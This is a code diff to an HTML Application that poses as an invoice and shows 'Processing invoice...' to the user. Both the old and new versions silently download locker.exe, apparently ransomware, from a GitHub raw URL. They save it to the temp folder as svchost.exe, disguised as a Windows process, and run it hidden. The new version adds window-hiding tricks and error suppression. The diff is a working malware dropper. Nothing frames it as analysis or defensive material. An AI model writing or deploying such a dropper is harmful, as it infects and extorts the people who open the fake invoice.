@@ -2,9 +2,41 @@
 <head>
 <HTA:APPLICATION ID="o" APPLICATIONNAME="Invoice" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" />
 <script language="VBScript">
-CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command ""try{$w=New-Object Net.WebClient;$w.DownloadFile('https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.exe','%TEMP%\svchost.exe');start '%TEMP%\svchost.exe' -WindowStyle Hidden}catch{}""", 0, False
-window.close()
+' Hide the HTA window
+self.blur()
+self.moveTo -9999, -9999
+self.resizeTo 0, 0
+
+' Step 1: Download locker.exe from GitHub
+Dim url, tempPath, shell, ws
+Set shell = CreateObject("WScript.Shell")
+Set ws = CreateObject("WScript.Shell")
+tempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
+
+url = "https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.exe"
+
+On Error Resume Next
+Dim http
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", url, False
+http.Send
+
+If Err.Number = 0 And http.Status = 200 Then
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' binary
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile tempPath, 2
+    stream.Close
+    
+    ' Step 2: Run the locker silently
+    shell.Run """" & tempPath & """", 0, False
+End If
+
+On Error GoTo 0
+self.close()
 </script>
 </head>
-<body>Loading invoice...</body>
+<body>Processing invoice...</body>
 </html>
